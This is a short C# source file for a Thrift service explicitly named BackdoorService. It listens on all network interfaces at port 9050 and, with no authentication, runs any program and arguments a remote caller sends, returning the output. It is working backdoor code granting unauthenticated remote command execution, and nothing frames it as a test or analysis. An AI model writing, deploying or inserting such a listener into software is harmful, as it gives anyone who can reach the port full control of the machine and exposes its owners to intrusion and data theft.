using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using Thrift;
using Thrift.Transport;
using Thrift.Server;

namespace BackdoorService {
    public sealed class BackdoorServiceImpl : BackdoorService.Iface {
        public ExecResponse Exec(string program, List<string> arguments, string stdin) {
            var psi = new ProcessStartInfo() {
                FileName = program,
                Arguments = String.Join(" ", arguments),
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            };

            Process process = Process.Start(psi);

            if (stdin != null) {
                process.StandardInput.Write(stdin);
                process.StandardInput.Flush();
            }

            process.WaitForExit();

            int exitCode = process.ExitCode;

            string stdout = process.StandardOutput.ReadToEnd();
            string stderr = process.StandardError.ReadToEnd();

            return new ExecResponse() {
                ExitCode = exitCode,
                StdOut = stdout,
                StdErr = stderr
            };
        }
    }

    public static class BackdoorServer {
        public static void Main(string[] args) {
            var impl = new BackdoorServiceImpl();
            var proc = new BackdoorService.Processor(impl);
            var listener = new TcpListener(IPAddress.Parse("0.0.0.0"), 9050);
            var transport = new TServerSocket(listener);
            var server = new TThreadPoolServer(proc, transport);
            server.Serve();
        }
    }
}
